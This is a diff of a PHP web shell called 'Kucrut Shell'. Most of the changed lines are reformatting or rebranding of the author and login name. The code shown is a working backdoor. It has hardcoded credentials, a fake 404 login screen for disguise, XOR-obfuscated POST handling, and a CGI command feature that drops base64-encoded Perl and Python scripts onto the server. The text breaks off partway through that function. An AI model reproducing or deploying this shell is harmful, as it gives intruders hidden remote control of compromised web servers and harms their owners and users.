@@ -1,13 +1,13 @@
 <?php
 /*
-	Author: 	Solevisible/Tobrut-Style
-	Telegram: 	https://telegram.me/
-	YouTube: 	https://youtube.com/solevisible
-	Gmail:		solevisible@gmail.com
-	Date:		Monday, September 14, 2020
+    Author:     Solevisible/Tobrut_Style
+    Telegram:   https://telegram.me/
+    YouTube:    https://youtube.com/solevisible
+    Gmail:      solevisible@gmail.com
+    Date:       Monday, September 14, 2020
 */
 $GLOBALS['oZgNypoPRU'] = array(
-    'username' => 'kucrut',
+    'username' => 'tobrut',
     'password' => '85813ffefb9d5b619a7c3ff39edeb864',
     'safe_mode' => '1',
     'login_page' => '404',
@@ -127,42 +127,42 @@ $GLOBALS['DB_NAME'] = $GLOBALS['oZgNypoPRU'];
 
 foreach ($GLOBALS['DB_NAME'] as $key => $value)
 {
-	$prefix = substr($key, 0, 2);
-	if ($prefix == "us")
-	{
-		$GLOBALS['DB_NAME']["user"] = $value;
-		$GLOBALS['DB_NAME']["user_rand"] = $key;
-	}
-	elseif ($prefix == "pa")
-	{
-		$GLOBALS['DB_NAME']["pass"] = $value;
-		$GLOBALS['DB_NAME']["pass_rand"] = $key;
-	}
-	elseif ($prefix == "sa")
-	{
-		$GLOBALS['DB_NAME']["safemode"] = $value;
-		$GLOBALS['DB_NAME']["safemode_rand"] = $key;
-	}
-	elseif ($prefix == "lo")
-	{
-		$GLOBALS['DB_NAME']["login_page"] = $value;
-		$GLOBALS['DB_NAME']["login_page_rand"] = $key;
-	}
-	elseif ($prefix == "sh")
-	{
-		$GLOBALS['DB_NAME']["show_icons"] = $value;
-		$GLOBALS['DB_NAME']["show_icons_rand"] = $key;
-	}
-	elseif ($prefix == "po")
-	{
-		$GLOBALS['DB_NAME']["post_encryption"] = $value;
-		$GLOBALS['DB_NAME']["post_encryption_rand"] = $key;
-	}
-	elseif ($prefix == "cg")
-	{
-		$GLOBALS['DB_NAME']["cgi_api"] = $value;
-		$GLOBALS['DB_NAME']["cgi_api_rand"] = $key;
-	}
+    $prefix = substr($key, 0, 2);
+    if ($prefix == "us")
+    {
+        $GLOBALS['DB_NAME']["user"] = $value;
+        $GLOBALS['DB_NAME']["user_rand"] = $key;
+    }
+    elseif ($prefix == "pa")
+    {
+        $GLOBALS['DB_NAME']["pass"] = $value;
+        $GLOBALS['DB_NAME']["pass_rand"] = $key;
+    }
+    elseif ($prefix == "sa")
+    {
+        $GLOBALS['DB_NAME']["safemode"] = $value;
+        $GLOBALS['DB_NAME']["safemode_rand"] = $key;
+    }
+    elseif ($prefix == "lo")
+    {
+        $GLOBALS['DB_NAME']["login_page"] = $value;
+        $GLOBALS['DB_NAME']["login_page_rand"] = $key;
+    }
+    elseif ($prefix == "sh")
+    {
+        $GLOBALS['DB_NAME']["show_icons"] = $value;
+        $GLOBALS['DB_NAME']["show_icons_rand"] = $key;
+    }
+    elseif ($prefix == "po")
+    {
+        $GLOBALS['DB_NAME']["post_encryption"] = $value;
+        $GLOBALS['DB_NAME']["post_encryption_rand"] = $key;
+    }
+    elseif ($prefix == "cg")
+    {
+        $GLOBALS['DB_NAME']["cgi_api"] = $value;
+        $GLOBALS['DB_NAME']["cgi_api_rand"] = $key;
+    }
 }
 
 unset($GLOBALS['oZgNypoPRU']);
@@ -183,330 +183,330 @@ define("__HOST_DATA_FOLDER__", "HOST_DATA");
 define("__HOST_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true?true:false));
 define("__HOST_SECRET_KEY__", __HOST_POST_ENCRYPTION__?_KucrutSecretKey():'');
 $GLOBALS['__HOST_COLOR__'] = array(
-		"shell_border" => array(
-			"key_color" => "#0E304A",
-			"multi_selector" => array(
-				".header" => "border: 7px solid {color}",
-				"#meunlist" => "border-color: {color}",
-				"#hidden_sh" => "background-color: {color}",
-				".ajaxarea" => "border: 1px solid {color}",
-				".foot" => "border-color: {color}",
-			)
-		),
-		"header_vars" => "#27979B",
-		"header_values" => "#67ABDF",
-		"header_on" => "#00FF00",
-		"header_off" => "#ff0000",
-		"header_none" => "#00FF00",
-		"home_shell" => "#ff0000",
-		"home_shell:hover" => array(
-			"key_color" => "#FFFFFF",
-			"multi_selector" => array(
-				".home_shell:hover" => "color: {color};",
-			)
-		),
-		"back_shell" => "#efbe73",
-		"back_shell:hover" => array(
-			"key_color" => "#FFFFFF",
-			"multi_selector" => array(
-				".back_shell:hover" => "color: {color};",
-			)
-		),
-		"header_pwd" => "#00FF00",
-		"header_pwd:hover" => array(
-			"key_color" => "#FFFFFF",
-			"multi_selector" => array(
-				".header_pwd:hover" => "color: {color};",
-			)
-		),
-		"header_drive" => "#00FF00",
-		"header_drive:hover" => array(
-			"key_color" => "#FFFFFF",
-			"multi_selector" => array(
-				".header_drive:hover" => "color: {color};",
-			)
-		),
-		"header_show_all" => "#00FF00",
-		"disable_functions" => "#ff0000",
-		"footer_text" => "#27979B",
-		"menu_options" => "#27979B",
-		"menu_options:hover" => array(
-			"key_color" => "#646464",
-			"multi_selector" => array(
-				".menu_options:hover" => "background-color: {color};font-weight: unset;",
-			)
-		),
-		"options_list" => array(
-			"key_color" => "#00FF00",
-			"multi_selector" => array(
-				".content_options_holder .header center a" => "color: {color};",
-			)
-		),
-		"options_list:hover" => array(
-			"key_color" => "#FFFFFF",
-			"multi_selector" => array(
-				".content_options_holder .header center a:hover" => "color: {color};",
-			)
-		),
-		"options_list_header" => array(
-			"key_color" => "#59cc33",
-			"multi_selector" => array(
-				".txtfont_header" => "color: {color};",
-			)
-		),
-		"options_list_text" => array(
-			"key_color" => "#FFFFFF",
-			"multi_selector" => array(
-				".txtfont,.tbltxt" => "color: {color};",
-			)
-		),
-		"Kucrut+" => array(
-			"key_color" => "#06ff0f",
-			"multi_selector" => array(
-				".kucrut_plus" => "color: {color};font-weight: unset;",
-			)
-		),
-		"hidden_shell_text" => array(
-			"key_color" => "#00FF00",
-			"multi_selector" => array(
-				"#hidden_sh a" => "color: {color};",
-			)
-		),
-		"hidden_shell_version" => "#ff0000",
-		"shell_name" => "#FF0000",
-		"main_row:hover" => array(
-			"key_color" => "#646464",
-			"multi_selector" => array(
-				".main tr:hover" => "background-color: {color};",
-			)
-		),
-		"main_header" => array(
-			"key_color" => "#FFFFFF",
-			"multi_selector" => array(
-				".main th" => "color: {color};",
-			)
-		),
-		"main_name" => array(
-			"key_color" => "#FFFFFF",
-			"multi_selector" => array(
-				".main .main_name" => "color: {color};font-weight: unset;",
-			)
-		),
-		"main_size" => "#67ABDF",
-		"main_modify" => "#67ABDF",
-		"main_owner_group" => "#67ABDF",
-		"main_green_perm" => "#25ff00",
-		"main_red_perm" => "#FF0000",
-		"main_white_perm" => "#FFFFFF",
-		"beetween_perms" => "#FFFFFF",
-		"main_actions" => array(
-			"key_color" => "#FFFFFF",
-			"multi_selector" => array(
-				".main .actions" => "color: {color};",
-			)
-		),
-		"menu_options:hover" => array(
-			"key_color" => "#646464",
-			"multi_selector" => array(
-				".menu_options:hover" => "background-color: {color};font-weight: unset;",
-			)
-		),
-		"minimize_editor_background" => array(
-			"key_color" => "#0e304a",
-			"multi_selector" => array(
-				".minimized-wrapper" => "background-color: {color};",
-			)
-		),
-		"minimize_editor_text" => array(
-			"key_color" => "#f5deb3",
-			"multi_selector" => array(
-				".minimized-text" => "color: {color};",
-			)
-		),
-		"editor_border" => array(
-			"key_color" => "#0e304a",
-			"multi_selector" => array(
-				".editor-explorer,.editor-modal" => "border: 2px solid {color};",
-			)
-		),
-		"editor_background" => array(
-			"key_color" => "rgba(0, 1, 23, 0.94)",
-			"multi_selector" => array(
-				".editor-explorer,.editor-modal" => "background-color: {color};",
-			)
-		),
-		"editor_header_background" => array(
-			"key_color" => "rgba(21, 66, 88, 0.93)",
-			"multi_selector" => array(
-				".editor-header" => "background-color: {color};",
-			)
-		),
-		"editor_header_text" => array(
-			"key_color" => "#00ff7f",
-			"multi_selector" => array(
-				".editor-path" => "color: {color};",
-			)
-		),
-		"editor_header_button" => array(
-			"key_color" => "#1d5673",
-			"multi_selector" => array(
-				".close-button, .editor-minimize" => "background-color: {color};",
-			)
-		),
-		"editor_actions" => array(
-			"key_color" => "#FFFFFF",
-			"multi_selector" => array(
-				".editor_actions" => "color: {color};",
-			)
-		),
-		"editor_file_info_vars" => array(
-			"key_color" => "#FFFFFF",
-			"multi_selector" => array(
-				".editor_file_info_vars" => "color: {color};",
-			)
-		),
-		"editor_file_info_values" => array(
-			"key_color" => "#67ABDF",
-			"multi_selector" => array(
-				".filestools" => "color: {color};",
-			)
-		),
-		"editor_history_header" => array(
-			"key_color" => "#14ff07",
-			"multi_selector" => array(
-				".hheader-text,.history-clear" => "color: {color};",
-			)
-		),
-		"editor_history_list" => array(
-			"key_color" => "#03b3a3",
-			"multi_selector" => array(
-				".editor-file-name" => "color: {color};",
-			)
-		),
-		"editor_history_selected_file" => array(
-			"key_color" => "rgba(49, 55, 93, 0.77)",
-			"multi_selector" => array(
-				".is_active" => "background-color: {color};",
-			)
-		),
-		"editor_history_file:hover" => array(
-			"key_color" => "#646464",
-			"multi_selector" => array(
-				".file-holder > .history:hover" => "background-color: {color};",
-			)
-		),
-		"input_box_border" => array(
-			"key_color" => "#0E304A",
-			"multi_selector" => array(
-				"input[type=text],textarea" => "border: 1px solid {color}",
-			)
-		),
-		"input_box_text" => array(
-			"key_color" => "#999999",
-			"multi_selector" => array(
-				"input[type=text],textarea" => "color: {color};",
-			)
-		),
-		"input_box:hover" => array(
-			"key_color" => "#27979B",
-			"multi_selector" => array(
-				"input[type=text]:hover,textarea:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
-			)
-		),
-		"select_box_border" => array(
-			"key_color" => "#0E304A",
-			"multi_selector" => array(
-				"select" => "border: 1px solid {color}",
-			)
-		),
-		"select_box_text" => array(
-			"key_color" => "#FFFFEE",
-			"multi_selector" => array(
-				"select" => "color: {color};",
-			)
-		),
-		"select_box:hover" => array(
-			"key_color" => "#27979B",
-			"multi_selector" => array(
-				"select:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
-			)
-		),
-		"button_border" => array(
-			"key_color" => "#27979B",
-			"multi_selector" => array(
-				"input[type=submit],.button,#addup" => "border: 1px solid {color};",
-			)
-		),
-		"button:hover" => array(
-			"key_color" => "#27979B",
-			"multi_selector" => array(
-				"input[type=submit]:hover" => "box-shadow:0 0 4px {color};border:2px solid {color};",
-				".button:hover,#addup:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
-			)
-		),
-		"outputs_text" => array(
-			"key_color" => "#67ABDF",
-			"multi_selector" => array(
-				".ml1" => "color: {color};",
-			)
-		),
-		"outputs_border" => array(
-			"key_color" => "#0E304A",
-			"multi_selector" => array(
-				".ml1" => "border: 1px solid {color};",
-			)
-		),
-		"uploader_border" => array(
-			"key_color" => "#0E304A",
-			"multi_selector" => array(
-				".inputfile" => "box-shadow:0 0 4px {color};border:1px solid {color};",
-			)
-		),
-		"uploader_background" => array(
-			"key_color" => "#0E304A",
-			"multi_selector" => array(
-				".inputfile strong" => "background-color: {color};",
-			)
-		),
-		"uploader_text_right" => array(
-			"key_color" => "#FFFFFF",
-			"multi_selector" => array(
-				".inputfile strong" => "color: {color};",
-			)
-		),
-		"uploader_text_left" => array(
-			"key_color" => "#25ff00",
-			"multi_selector" => array(
-				".inputfile span" => "color: {color};",
-			)
-		),
-		"uploader:hover" => array(
-			"key_color" => "#27979B",
-			"multi_selector" => array(
-				".inputfile:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
-			)
-		),
-		"uploader_progress_bar" => array(
-			"key_color" => "#00ff00",
-			"multi_selector" => array(
-				".up_bar" => "background-color: {color};",
-			)
-		),
-		"mysql_tables" => "#00FF00",
-		"mysql_table_count" => "#67ABDF",
-		"copyright" => "#dfff00",
-		"scrollbar" => array(
-			"key_color" => "#1e82b5",
-			"multi_selector" => array(
-				"*::-webkit-scrollbar-thumb" => "background-color: {color};",
-			)
-		),
-		"scrollbar_background" => array(
-			"key_color" => "#000115",
-			"multi_selector" => array(
-				"*::-webkit-scrollbar-track" => "background-color: {color};",
-			)
-		),
+        "shell_border" => array(
+            "key_color" => "#0E304A",
+            "multi_selector" => array(
+                ".header" => "border: 7px solid {color}",
+                "#meunlist" => "border-color: {color}",
+                "#hidden_sh" => "background-color: {color}",
+                ".ajaxarea" => "border: 1px solid {color}",
+                ".foot" => "border-color: {color}",
+            )
+        ),
+        "header_vars" => "#27979B",
+        "header_values" => "#67ABDF",
+        "header_on" => "#00FF00",
+        "header_off" => "#ff0000",
+        "header_none" => "#00FF00",
+        "home_shell" => "#ff0000",
+        "home_shell:hover" => array(
+            "key_color" => "#FFFFFF",
+            "multi_selector" => array(
+                ".home_shell:hover" => "color: {color};",
+            )
+        ),
+        "back_shell" => "#efbe73",
+        "back_shell:hover" => array(
+            "key_color" => "#FFFFFF",
+            "multi_selector" => array(
+                ".back_shell:hover" => "color: {color};",
+            )
+        ),
+        "header_pwd" => "#00FF00",
+        "header_pwd:hover" => array(
+            "key_color" => "#FFFFFF",
+            "multi_selector" => array(
+                ".header_pwd:hover" => "color: {color};",
+            )
+        ),
+        "header_drive" => "#00FF00",
+        "header_drive:hover" => array(
+            "key_color" => "#FFFFFF",
+            "multi_selector" => array(
+                ".header_drive:hover" => "color: {color};",
+            )
+        ),
+        "header_show_all" => "#00FF00",
+        "disable_functions" => "#ff0000",
+        "footer_text" => "#27979B",
+        "menu_options" => "#27979B",
+        "menu_options:hover" => array(
+            "key_color" => "#646464",
+            "multi_selector" => array(
+                ".menu_options:hover" => "background-color: {color};font-weight: unset;",
+            )
+        ),
+        "options_list" => array(
+            "key_color" => "#00FF00",
+            "multi_selector" => array(
+                ".content_options_holder .header center a" => "color: {color};",
+            )
+        ),
+        "options_list:hover" => array(
+            "key_color" => "#FFFFFF",
+            "multi_selector" => array(
+                ".content_options_holder .header center a:hover" => "color: {color};",
+            )
+        ),
+        "options_list_header" => array(
+            "key_color" => "#59cc33",
+            "multi_selector" => array(
+                ".txtfont_header" => "color: {color};",
+            )
+        ),
+        "options_list_text" => array(
+            "key_color" => "#FFFFFF",
+            "multi_selector" => array(
+                ".txtfont,.tbltxt" => "color: {color};",
+            )
+        ),
+        "Kucrut+" => array(
+            "key_color" => "#06ff0f",
+            "multi_selector" => array(
+                ".kucrut_plus" => "color: {color};font-weight: unset;",
+            )
+        ),
+        "hidden_shell_text" => array(
+            "key_color" => "#00FF00",
+            "multi_selector" => array(
+                "#hidden_sh a" => "color: {color};",
+            )
+        ),
+        "hidden_shell_version" => "#ff0000",
+        "shell_name" => "#FF0000",
+        "main_row:hover" => array(
+            "key_color" => "#646464",
+            "multi_selector" => array(
+                ".main tr:hover" => "background-color: {color};",
+            )
+        ),
+        "main_header" => array(
+            "key_color" => "#FFFFFF",
+            "multi_selector" => array(
+                ".main th" => "color: {color};",
+            )
+        ),
+        "main_name" => array(
+            "key_color" => "#FFFFFF",
+            "multi_selector" => array(
+                ".main .main_name" => "color: {color};font-weight: unset;",
+            )
+        ),
+        "main_size" => "#67ABDF",
+        "main_modify" => "#67ABDF",
+        "main_owner_group" => "#67ABDF",
+        "main_green_perm" => "#25ff00",
+        "main_red_perm" => "#FF0000",
+        "main_white_perm" => "#FFFFFF",
+        "beetween_perms" => "#FFFFFF",
+        "main_actions" => array(
+            "key_color" => "#FFFFFF",
+            "multi_selector" => array(
+                ".main .actions" => "color: {color};",
+            )
+        ),
+        "menu_options:hover" => array(
+            "key_color" => "#646464",
+            "multi_selector" => array(
+                ".menu_options:hover" => "background-color: {color};font-weight: unset;",
+            )
+        ),
+        "minimize_editor_background" => array(
+            "key_color" => "#0e304a",
+            "multi_selector" => array(
+                ".minimized-wrapper" => "background-color: {color};",
+            )
+        ),
+        "minimize_editor_text" => array(
+            "key_color" => "#f5deb3",
+            "multi_selector" => array(
+                ".minimized-text" => "color: {color};",
+            )
+        ),
+        "editor_border" => array(
+            "key_color" => "#0e304a",
+            "multi_selector" => array(
+                ".editor-explorer,.editor-modal" => "border: 2px solid {color};",
+            )
+        ),
+        "editor_background" => array(
+            "key_color" => "rgba(0, 1, 23, 0.94)",
+            "multi_selector" => array(
+                ".editor-explorer,.editor-modal" => "background-color: {color};",
+            )
+        ),
+        "editor_header_background" => array(
+            "key_color" => "rgba(21, 66, 88, 0.93)",
+            "multi_selector" => array(
+                ".editor-header" => "background-color: {color};",
+            )
+        ),
+        "editor_header_text" => array(
+            "key_color" => "#00ff7f",
+            "multi_selector" => array(
+                ".editor-path" => "color: {color};",
+            )
+        ),
+        "editor_header_button" => array(
+            "key_color" => "#1d5673",
+            "multi_selector" => array(
+                ".close-button, .editor-minimize" => "background-color: {color};",
+            )
+        ),
+        "editor_actions" => array(
+            "key_color" => "#FFFFFF",
+            "multi_selector" => array(
+                ".editor_actions" => "color: {color};",
+            )
+        ),
+        "editor_file_info_vars" => array(
+            "key_color" => "#FFFFFF",
+            "multi_selector" => array(
+                ".editor_file_info_vars" => "color: {color};",
+            )
+        ),
+        "editor_file_info_values" => array(
+            "key_color" => "#67ABDF",
+            "multi_selector" => array(
+                ".filestools" => "color: {color};",
+            )
+        ),
+        "editor_history_header" => array(
+            "key_color" => "#14ff07",
+            "multi_selector" => array(
+                ".hheader-text,.history-clear" => "color: {color};",
+            )
+        ),
+        "editor_history_list" => array(
+            "key_color" => "#03b3a3",
+            "multi_selector" => array(
+                ".editor-file-name" => "color: {color};",
+            )
+        ),
+        "editor_history_selected_file" => array(
+            "key_color" => "rgba(49, 55, 93, 0.77)",
+            "multi_selector" => array(
+                ".is_active" => "background-color: {color};",
+            )
+        ),
+        "editor_history_file:hover" => array(
+            "key_color" => "#646464",
+            "multi_selector" => array(
+                ".file-holder > .history:hover" => "background-color: {color};",
+            )
+        ),
+        "input_box_border" => array(
+            "key_color" => "#0E304A",
+            "multi_selector" => array(
+                "input[type=text],textarea" => "border: 1px solid {color}",
+            )
+        ),
+        "input_box_text" => array(
+            "key_color" => "#999999",
+            "multi_selector" => array(
+                "input[type=text],textarea" => "color: {color};",
+            )
+        ),
+        "input_box:hover" => array(
+            "key_color" => "#27979B",
+            "multi_selector" => array(
+                "input[type=text]:hover,textarea:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
+            )
+        ),
+        "select_box_border" => array(
+            "key_color" => "#0E304A",
+            "multi_selector" => array(
+                "select" => "border: 1px solid {color}",
+            )
+        ),
+        "select_box_text" => array(
+            "key_color" => "#FFFFEE",
+            "multi_selector" => array(
+                "select" => "color: {color};",
+            )
+        ),
+        "select_box:hover" => array(
+            "key_color" => "#27979B",
+            "multi_selector" => array(
+                "select:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
+            )
+        ),
+        "button_border" => array(
+            "key_color" => "#27979B",
+            "multi_selector" => array(
+                "input[type=submit],.button,#addup" => "border: 1px solid {color};",
+            )
+        ),
+        "button:hover" => array(
+            "key_color" => "#27979B",
+            "multi_selector" => array(
+                "input[type=submit]:hover" => "box-shadow:0 0 4px {color};border:2px solid {color};",
+                ".button:hover,#addup:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
+            )
+        ),
+        "outputs_text" => array(
+            "key_color" => "#67ABDF",
+            "multi_selector" => array(
+                ".ml1" => "color: {color};",
+            )
+        ),
+        "outputs_border" => array(
+            "key_color" => "#0E304A",
+            "multi_selector" => array(
+                ".ml1" => "border: 1px solid {color};",
+            )
+        ),
+        "uploader_border" => array(
+            "key_color" => "#0E304A",
+            "multi_selector" => array(
+                ".inputfile" => "box-shadow:0 0 4px {color};border:1px solid {color};",
+            )
+        ),
+        "uploader_background" => array(
+            "key_color" => "#0E304A",
+            "multi_selector" => array(
+                ".inputfile strong" => "background-color: {color};",
+            )
+        ),
+        "uploader_text_right" => array(
+            "key_color" => "#FFFFFF",
+            "multi_selector" => array(
+                ".inputfile strong" => "color: {color};",
+            )
+        ),
+        "uploader_text_left" => array(
+            "key_color" => "#25ff00",
+            "multi_selector" => array(
+                ".inputfile span" => "color: {color};",
+            )
+        ),
+        "uploader:hover" => array(
+            "key_color" => "#27979B",
+            "multi_selector" => array(
+                ".inputfile:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
+            )
+        ),
+        "uploader_progress_bar" => array(
+            "key_color" => "#00ff00",
+            "multi_selector" => array(
+                ".up_bar" => "background-color: {color};",
+            )
+        ),
+        "mysql_tables" => "#00FF00",
+        "mysql_table_count" => "#67ABDF",
+        "copyright" => "#dfff00",
+        "scrollbar" => array(
+            "key_color" => "#1e82b5",
+            "multi_selector" => array(
+                "*::-webkit-scrollbar-thumb" => "background-color: {color};",
+            )
+        ),
+        "scrollbar_background" => array(
+            "key_color" => "#000115",
+            "multi_selector" => array(
+                "*::-webkit-scrollbar-track" => "background-color: {color};",
+            )
+        ),
 );
 $GLOBALS['__file_path'] = str_replace('\\','/',trim(preg_replace('!\(\d+\)\s.*!', '', __FILE__)));
 $config = array('KucrutUser' => $GLOBALS['DB_NAME']['user'],'KucrutPass' => $GLOBALS['DB_NAME']['pass'],'KucrutProtectShell' => $GLOBALS['DB_NAME']['safemode'],'KucrutLoginPage' => $GLOBALS['DB_NAME']['login_page']);
@@ -533,7 +533,7 @@ body{background: black;}
 #loginbox td { border-radius:5px; font-size:11px; }
 </style>
 <title>~ Kucrut Shell-v'.__HOST_VERSION__.'-'.__HOST_CODE_NAME__.' ~</title><center>
-<center><img style="border-radius:100px;" width="500" height="250" alt="Tobrut Style 2012" draggable="false" src="https://res.cloudinary.com/dzujj1seq/image/upload/v1719811646/SEOTOBRUT_kx1nyj.png" /></center>
+<center><img style="border-radius:100px;" width="500" height="250" alt="kucrut team 2012" draggable="false" src="https://res.cloudinary.com/dzujj1seq/image/upload/v1719811646/SEOTOBRUT_kx1nyj.png" /></center>
 <div id=loginbox><p><font face="verdana,arial" size=-1>
 <center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
 <tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ Kucrut Shell-v'.__HOST_VERSION__.'-'.__HOST_CODE_NAME__.' ~</b></font></th></tr>
@@ -581,65 +581,65 @@ exit;
 }
 }
 function decrypt_post($str){
-	if(__HOST_POST_ENCRYPTION__){
-		$pwd = __HOST_SECRET_KEY__;
-		$pwd     = __ZW5jb2Rlcg($pwd);
-		$str     = __ZGVjb2Rlcg($str);
-		$enc_chr = "";
-		$enc_str = "";
-		$i       = 0;
-		while ($i < strlen($str)) {
-			for ($j = 0; $j < strlen($pwd); $j++) {
-				$enc_chr = chr(ord($str[$i]) ^ ord($pwd[$j]));
-				$enc_str .= $enc_chr;
-				$i++;
-				if ($i >= strlen($str))
-					break;
-			}
-		}
-		return __ZGVjb2Rlcg($enc_str);
-	}else{
-		return __ZGVjb2Rlcg($str);
-	}
+    if(__HOST_POST_ENCRYPTION__){
+        $pwd = __HOST_SECRET_KEY__;
+        $pwd     = __ZW5jb2Rlcg($pwd);
+        $str     = __ZGVjb2Rlcg($str);
+        $enc_chr = "";
+        $enc_str = "";
+        $i       = 0;
+        while ($i < strlen($str)) {
+            for ($j = 0; $j < strlen($pwd); $j++) {
+                $enc_chr = chr(ord($str[$i]) ^ ord($pwd[$j]));
+                $enc_str .= $enc_chr;
+                $i++;
+                if ($i >= strlen($str))
+                    break;
+            }
+        }
+        return __ZGVjb2Rlcg($enc_str);
+    }else{
+        return __ZGVjb2Rlcg($str);
+    }
 }
 
 function _KucrutSecretKey(){
-	$secret = @$_COOKIE["KucrutSecretKey"];
-	if(!isset($_COOKIE["KucrutSecretKey"])){
-		$secret = uniqid(mt_rand(), true);
-		__kucrut_set_cookie("KucrutSecretKey", $secret);
-	}
-	return $secret;
+    $secret = @$_COOKIE["KucrutSecretKey"];
+    if(!isset($_COOKIE["KucrutSecretKey"])){
+        $secret = uniqid(mt_rand(), true);
+        __kucrut_set_cookie("KucrutSecretKey", $secret);
+    }
+    return $secret;
 }
 function kucrut_getColor($target){
-	if(isset($GLOBALS["DB_NAME"]["color"][$target])&&$GLOBALS["DB_NAME"]["color"][$target]!=""){
-		return $GLOBALS["DB_NAME"]["color"][$target];
-	}else{
-		$target = $GLOBALS["__HOST_COLOR__"][$target];
-		if(is_array($target)){
-			return $target["key_color"];
-		}else{
-			return $target;
-		}
-	}
+    if(isset($GLOBALS["DB_NAME"]["color"][$target])&&$GLOBALS["DB_NAME"]["color"][$target]!=""){
+        return $GLOBALS["DB_NAME"]["color"][$target];
+    }else{
+        $target = $GLOBALS["__HOST_COLOR__"][$target];
+        if(is_array($target)){
+            return $target["key_color"];
+        }else{
+            return $target;
+        }
+    }
 }
 function kucrutCssLoadColors(){
-	$css = "";
-	foreach($GLOBALS['__HOST_COLOR__'] as $key => $value){
-		if(!is_array($value)){
-			$value = kucrut_getColor($key);
-			$css .= ".{$key}{color: {$value};}";
-		}else{
-			if(isset($value["multi_selector"])){
-				foreach($value["multi_selector"] as $k => $v){
-					$color = kucrut_getColor($key);
-					$code = str_replace("{color}", $color, $v);
-					$css .=  $k."{".$code."}";
-				}
-			}
-		}
-	}
-	return $css;
+    $css = "";
+    foreach($GLOBALS['__HOST_COLOR__'] as $key => $value){
+        if(!is_array($value)){
+            $value = kucrut_getColor($key);
+            $css .= ".{$key}{color: {$value};}";
+        }else{
+            if(isset($value["multi_selector"])){
+                foreach($value["multi_selector"] as $k => $v){
+                    $color = kucrut_getColor($key);
+                    $code = str_replace("{color}", $color, $v);
+                    $css .=  $k."{".$code."}";
+                }
+            }
+        }
+    }
+    return $css;
 }
 if(isset($_POST['ajax'])){
 function KucrutNum(){
@@ -661,98 +661,98 @@ echo 'kucrut'.$kucrut."_=";
 echo '""</script>';
 }}
 function _kucrut_cgicmd($cmd,$lang="perl",$set_cookie=false){
-	if(!$GLOBALS["DB_NAME"]["cgi_api"]){
-		return "";
-	}
-	if(isset($_COOKIE["kucrutcgiapi_mode"])){
-		return "";
-	}
-	$cmd_pure = $cmd;
-	$is_curl = function_exists('curl_version');
-	$is_socket = function_exists('fsockopen');
-	if($is_curl||$is_socket){
-		$recreate = false;
-		if(isset($_COOKIE["kucrutcgiapi"])){
-			if(!@file_exists("kucrutcgiapi/".$_COOKIE["kucrutcgiapi"].".kucrut")){
-				$recreate = true;
-				$lang = $_COOKIE["kucrutcgiapi"];
-			}
-		}
-		if(!isset($_COOKIE["kucrutcgiapi"])||$recreate){
-			@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
-			$perl = 'jZFRT8IwFIXf/RXXOqWNsKoxPlAwRliERIbK9EUMGdsFGrYyt2Iky/ztdkMlJj74cpKee853k96Dfb7OUj6ViieYRgDQ6FdOtAr8iE99FcZS7a0zhEF/4DSb136GF+ciSaXSQDorpVHpht4k2ASN75ovdByN1VgRIWfUctynvPbg3D86I28ycLzesFsrAF+B3A1HHmF5vAFqyTpYS9wYffMjo1IxkaIf0pHX7buVYaRidYau57je5NZxb7xerWDiSipoQ5ZEUlN+xL/qs5UBBAvzAHoCtg3WgbFzM3u25Au0PyDj42MOfC7objfbkdpbUpmuwxkTZWhbO6S2zXjiB0tKAlKHBb5T65QxPkdRQv6RkioveQXYbSDjEwJyBjTEmVQY0p8pY7+TJVwU5bcalwRxSAqWby8RYrAKcTKtrvM1X2CwNAmbtJIUL4nINpnGmP4VrVDs+6otXhWK4hM=';
-			$py = "bZDBS8MwGMXPy19R66EtzhRk7DA3L1rxItOt3gajTb6twTQJydexIf7vJqvMiR5CyHvv93jk8iLvnM1roXJzwEYrgvYwIQPRGm0xYluB9W1/UVBVLSHNCOwZGPQpUzlHvqPaDX1sWFcOxiOy0baNZgGkjwIkX6K21RZSUDthtZp9JIvi9a1YluvnonyaPyST5GW+LJPPjLCWezIU0C3grpIdpIkXE281wN7/MYPsbWOFwii+1wpB4TUeDEwQ9pg32MqVXalwYiI2ka8L84/5fjGtxyMOTHNIj3XZVTw1Fu5iMmCNkHztkAs1jE4P3aFfoh012oC6Sf/WtDzLftGUSe3CBw4suE4G/ryOWqh4eo4E8cT0a3uSOrTC/KjxND+O/QI=";
